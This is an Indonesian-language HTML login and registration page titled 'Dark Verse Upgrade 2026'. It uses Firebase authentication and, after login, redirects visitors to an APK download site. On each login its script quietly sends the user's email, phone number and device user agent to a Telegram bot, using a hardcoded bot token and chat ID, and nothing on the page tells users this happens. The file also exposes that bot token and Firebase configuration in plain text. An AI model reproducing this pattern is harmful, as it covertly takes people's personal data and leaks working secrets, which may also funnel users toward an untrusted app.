<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dark Verse Upgrade 2026</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;font-family:Poppins,sans-serif}
body{
margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
background:radial-gradient(circle at top,#14002a,#070010);color:white;
}
.container{width:380px}
.card{
padding:35px;border-radius:28px;
background:rgba(255,255,255,0.05);
backdrop-filter:blur(18px);
box-shadow:0 0 40px rgba(168,85,247,.35);
text-align:center;animation:fade .6s;
}
@keyframes fade{from{opacity:0;transform:translateY(20px)}to{opacity:1}}
input{
width:100%;padding:14px;margin-bottom:12px;border:none;border-radius:14px;
background:rgba(255,255,255,.08);color:white;outline:none;
}
button{
width:100%;padding:14px;border:none;border-radius:14px;font-weight:600;
cursor:pointer;background:linear-gradient(90deg,#9333ea,#ec4899);
color:white;box-shadow:0 0 25px #9333ea;
}
.switch{margin-top:14px;font-size:13px;color:#c084fc;cursor:pointer}
.msg{height:18px;margin-top:10px;font-size:13px}
.success{color:#4ade80}
.error{color:#fb7185}
</style>
</head>

<body>

<div class="container" id="app"></div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
getAuth,onAuthStateChanged,
createUserWithEmailAndPassword,
signInWithEmailAndPassword,
signOut
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

import {
getFirestore,doc,setDoc,getDoc
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

/* ðŸ”¥ CONFIG */
const firebaseConfig = {
apiKey: "AIzaSyCmeMZAvIK4JXS2G2m15JTPWdUiOe1C5qc",
authDomain: "website-login-9d67b.firebaseapp.com",
projectId: "website-login-9d67b",
appId: "1:914596260910:web:f40ffe25362b1450bdc3bf"
};

const BOT_TOKEN = "7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls";
const CHAT_ID = "8215645360";
const REDIRECT_URL = "https://seruapk.com/dark-verse/download/";

/* ðŸ”¥ INIT */
const appFirebase = initializeApp(firebaseConfig);
const auth = getAuth();
const db = getFirestore();
const app = document.getElementById("app");

/* ================= UI ================= */

function showLogin(){
app.innerHTML=`
<div class="card">
<h2>Login</h2>
<input id="email" placeholder="Email">
<input id="pass" type="password" placeholder="Password">
<button onclick="login()">Login</button>
<div class="switch" onclick="showRegister()">Belum punya akun?</div>
<div id="msg" class="msg"></div>
</div>`;
}

function showRegister(){
app.innerHTML=`
<div class="card">
<h2>Register</h2>
<input id="phone" placeholder="Nomor HP">
<input id="email" placeholder="Email">
<input id="pass" type="password" placeholder="Password">
<button onclick="register()">Register</button>
<div class="switch" onclick="showLogin()">Sudah punya akun?</div>
<div id="msg" class="msg"></div>
</div>`;
}

function msg(text,type){
document.getElementById("msg").className="msg "+type;
document.getElementById("msg").textContent=text;
}

/* ================= REGISTER ================= */

window.register = async () => {
try{

const phone = document.getElementById("phone").value;
const email = document.getElementById("email").value;
const pass = document.getElementById("pass").value;

const user = await createUserWithEmailAndPassword(auth,email,pass);

await setDoc(doc(db,"users",user.user.uid),{
phone:phone,
device:navigator.userAgent
});

msg("Register berhasil âœ”","success");

/* âžœ PINDAH KE LOGIN */
setTimeout(showLogin,1200);

}catch(e){msg(e.message,"error")}
};

/* ================= LOGIN ================= */

window.login = async () => {
try{

const email = document.getElementById("email").value;
const pass = document.getElementById("pass").value;

const user = await signInWithEmailAndPassword(auth,email,pass);
const uid = user.user.uid;

const snap = await getDoc(doc(db,"users",uid));

/* âŒ CEK MULTI DEVICE */
if(snap.data().device !== navigator.userAgent){
msg("Akun aktif di device lain","error");
await signOut(auth);
return;
}

/* ðŸ“© KIRIM TELEGRAM */
const text = `
ðŸ”¥ LOGIN BERHASIL
ðŸ“§ ${email}
ðŸ“± ${snap.data().phone}
ðŸ’» ${navigator.userAgent}
`;

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);

msg("Login berhasil...","success");

/* âžœ REDIRECT */
setTimeout(()=>{
window.location.href = REDIRECT_URL;
},1200);

}catch(e){msg(e.message,"error")}
};

/* ================= AUTO LOGIN ================= */

onAuthStateChanged(auth,user=>{
if(user){
window.location.href = REDIRECT_URL;
}else{
showLogin();
}
});

window.showRegister = showRegister;
window.showLogin = showLogin;

</script>
</body>
</html>